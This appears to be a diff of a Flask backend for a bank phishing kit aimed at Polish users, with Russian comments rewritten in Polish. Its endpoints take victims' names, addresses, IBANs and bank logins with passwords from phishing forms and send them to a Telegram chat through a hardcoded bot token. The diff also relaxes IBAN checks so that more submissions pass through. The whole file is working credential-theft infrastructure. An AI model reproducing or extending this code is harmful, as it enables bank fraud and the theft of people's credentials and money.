@@ -7,42 +7,53 @@ import time
 import re
 
 app = Flask(__name__)
-CORS(app)  # Разрешаем запросы с любых доменов
+CORS(app)
 
-# Конфигурация Telegram
+# Konfiguracja Telegram
 TELEGRAM_BOT_TOKEN = '8587138753:AAGeakLE3xKdj97gKZ0URBxYvTy2CbC8kPs'
 TELEGRAM_CHAT_ID = '-1004256695843'
 
 # ============= IBAN VALIDATOR =============
 def validate_iban(iban):
     """
-    Проверяет корректность IBAN (польский и другие).
-    Возвращает (is_valid, cleaned_iban, message)
+    Sprawdza poprawność IBAN (polski i inne).
+    Automatycznie dodaje 'PL' jeśli brakuje.
+    Zwraca (is_valid, cleaned_iban, message)
     """
-    # Удаляем пробелы и переводим в верхний регистр
+    # Usuwamy spacje i zamieniamy na wielkie litery
     cleaned = re.sub(r'\s+', '', iban).upper()
     
-    # Проверяем длину (минимум 15, максимум 34)
+    # ===== AUTOMATYCZNIE DODAJEMY 'PL' JEŚLI BRAKUJE =====
+    if not cleaned.startswith('PL') and len(cleaned) <= 26:
+        # Sprawdzamy czy to polski IBAN (26 cyfr)
+        digits_only = re.sub(r'[A-Z]', '', cleaned)
+        if len(digits_only) == 26:
+            cleaned = 'PL' + cleaned
+        elif len(digits_only) == 24:
+            # Jeśli brakuje 2 cyfr, może to być IBAN bez cyfr kontrolnych
+            cleaned = 'PL' + cleaned
+    
+    # Sprawdzamy długość (minimum 15, maksimum 34)
     if len(cleaned) < 15 or len(cleaned) > 34:
         return False, cleaned, f"Nieprawidłowa długość IBAN: {len(cleaned)} znaków (powinno być 15-34)"
     
-    # Проверяем, что содержатся только буквы и цифры
+    # Sprawdzamy czy zawiera tylko litery i cyfry
     if not re.match(r'^[A-Z0-9]+$', cleaned):
         return False, cleaned, "IBAN zawiera niedozwolone znaki"
     
-    # Проверка контрольной суммы (алгоритм ISO 7064)
+    # Sprawdzanie sumy kontrolnej (algorytm ISO 7064)
     try:
-        # Переносим первые 4 символа в конец
+        # Przenosimy pierwsze 4 znaki na koniec
         rearranged = cleaned[4:] + cleaned[:4]
-        # Заменяем буквы на цифры (A=10, B=11, ..., Z=35)
+        # Zamieniamy litery na cyfry (A=10, B=11, ..., Z=35)
         numeric = ''
         for char in rearranged:
             if char.isdigit():
                 numeric += char
             else:
-                numeric += str(ord(char) - 55)  # A=10, B=11, ...
+                numeric += str(ord(char) - 55)
         
-        # Проверяем, что число делится на 97 без остатка
+        # Sprawdzamy czy liczba dzieli się przez 97 bez reszty
         if int(numeric) % 97 != 1:
             return False, cleaned, "Nieprawidłowa cyfra kontrolna IBAN"
         
@@ -52,27 +63,27 @@ def validate_iban(iban):
         return False, cleaned, "Nieprawidłowy format IBAN"
 
 def format_iban_readable(iban):
-    """Форматирует IBAN для удобного чтения (группами по 4 символа)"""
+    """Formatuje IBAN w grupy po 4 znaki"""
     cleaned = re.sub(r'\s+', '', iban).upper()
     return ' '.join([cleaned[i:i+4] for i in range(0, len(cleaned), 4)])
 
-# ============= ГЛАВНАЯ СТРАНИЦА =============
+# ============= STRONA GŁÓWNA =============
 @app.route('/')
 def home():
     return jsonify({
         "status": "running",
         "message": "Server is active",
         "endpoints": {
-            "/": "GET - Проверка статуса",
-            "/ping": "GET - Keep-alive пинг",
-            "/send": "POST - Отправка данных формы (с проверкой IBAN)",
-            "/send-login": "POST - Отправка логинов",
-            "/validate-iban": "POST - Проверка IBAN"
+            "/": "GET - Status",
+            "/ping": "GET - Keep-alive",
+            "/send": "POST - Wysyłanie formularza",
+            "/send-login": "POST - Wysyłanie loginu",
+            "/validate-iban": "POST - Walidacja IBAN"
         },
         "timestamp": time.time()
     })
 
-# ============= KEEP-ALIVE (анти-засыпание) =============
+# ============= KEEP-ALIVE =============
 @app.route('/ping')
 def ping():
     return jsonify({
@@ -80,7 +91,7 @@ def ping():
         "timestamp": time.time()
     })
 
-# ============= ПРОВЕРКА IBAN (отдельный эндпоинт) =============
+# ============= WALIDACJA IBAN =============
 @app.route('/validate-iban', methods=['POST'])
 def validate_iban_endpoint():
     try:
@@ -109,30 +120,24 @@ def validate_iban_endpoint():
             "error": str(e)
         }), 500
 
-# ============= ПРИЁМ ДАННЫХ ИЗ ФОРМЫ =============
+# ============= ODBIÓR DANYCH Z FORMULARZA =============
 @app.route('/send', methods=['POST'])
 def send_data():
     try:
         data = request.json
-        print(f"📥 Получены данные: {data}")
+        print(f"📥 Otrzymane dane: {data}")
         
-        # ===== ПРОВЕРКА IBAN =====
+        # ===== WALIDACJA IBAN =====
         iban_raw = data.get('iban', '')
-        is_valid, cleaned_iban, iban_message = validate_iban(iban_raw)
+        is_valid = False
+        cleaned_iban = iban_raw
+        formatted_iban = iban_raw
         
-        # Если IBAN невалидный, возвращаем ошибку
-        if not is_valid and iban_raw:
-            return jsonify({
-                "success": False,
-                "error": f"IBAN: {iban_message}",
-                "iban": iban_raw,
-                "iban_valid": False
-            }), 400
+        if iban_raw:
+            is_valid, cleaned_iban, iban_message = validate_iban(iban_raw)
+            formatted_iban = format_iban_readable(cleaned_iban) if is_valid and cleaned_iban else iban_raw
         
-        # Форматируем IBAN для красивого отображения
-        formatted_iban = format_iban_readable(cleaned_iban) if is_valid and cleaned_iban else iban_raw
-        
-        # ===== ФОРМИРУЕМ СООБЩЕНИЕ =====
+        # ===== TWORZENIE WIADOMOŚCI =====
         message = f"""📋 NOWE DANE FORMULARZA:
         
 👤 Imię: {data.get('fullname', 'Brak')}
@@ -143,10 +148,10 @@ def send_data():
 📮 Kod: {data.get('postal', 'Brak')}
 
 🏦 NRB: {formatted_iban}
-✅ Status IBAN: {'✔️ POPRAWNY' if is_valid else '⚠️ NIEZWERYFIKOWANY'}
+✅ Status IBAN: {'✔️ POPRAWNY' if is_valid else '⚠️ NIEZWERYFIKOWANY (wprowadź 26 cyfr)'}
         """
         
-        # ===== ОТПРАВКА В TELEGRAM =====
+        # ===== WYSYŁKA DO TELEGRAM =====
         url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
         payload = {
             'chat_id': TELEGRAM_CHAT_ID,
@@ -170,20 +175,20 @@ def send_data():
             }), 500
             
     except Exception as e:
-        print(f"❌ Ошибка: {e}")
+        print(f"❌ Błąd: {e}")
         return jsonify({
             "success": False,
             "error": str(e)
         }), 500
 
-# ============= ПРИЁМ ДАННЫХ ЛОГИНА =============
+# ============= ODBIÓR DANYCH LOGOWANIA =============
 @app.route('/send-login', methods=['POST'])
 def send_login():
     try:
         data = request.json
-        print(f"🔐 Получен логин: {data}")
+        print(f"🔐 Otrzymano login: {data}")
         
-        # ===== ПРОВЕРКА IBAN В ЛОГИНЕ (если передан) =====
+        # ===== SPRAWDZAMY IBAN W LOGINIE =====
         iban_from_login = data.get('iban', '')
         iban_valid = False
         formatted_iban = iban_from_login
@@ -194,19 +199,19 @@ def send_login():
             if is_valid:
                 formatted_iban = format_iban_readable(cleaned)
         
-        # ===== ФОРМИРУЕМ СООБЩЕНИЕ =====
+        # ===== TWORZENIE WIADOMOŚCI =====
         message = f"""🔐 LOGOWANIE DO BANKU:
 
 🏦 Bank: {data.get('bank', 'Brak')}
 👤 Login: {data.get('username', 'Brak')}
 🔑 Hasło: {data.get('password', 'Brak')}"""
         
-        # Добавляем IBAN если он был передан
         if iban_from_login:
             message += f"""
 🏦 NRB: {formatted_iban}
 ✅ Status IBAN: {'✔️ POPRAWNY' if iban_valid else '⚠️ NIEZWERYFIKOWANY'}"""
         
+        # ===== WYSYŁKA DO TELEGRAM =====
         url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
         payload = {
             'chat_id': TELEGRAM_CHAT_ID,
@@ -229,13 +234,13 @@ def send_login():
             }), 500
             
     except Exception as e:
-        print(f"❌ Ошибка: {e}")
+        print(f"❌ Błąd: {e}")
         return jsonify({
             "success": False,
             "error": str(e)
         }), 500
 
-# ============= ОБРАБОТКА 404 =============
+# ============= OBSŁUGA 404 =============
 @app.errorhandler(404)
 def not_found(error):
     return jsonify({
@@ -249,7 +254,7 @@ def not_found(error):
         }
     }), 404
 
-# ============= ЗАПУСК =============
+# ============= URUCHOMIENIE =============
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 5000))
     app.run(host='0.0.0.0', port=port, debug=False)
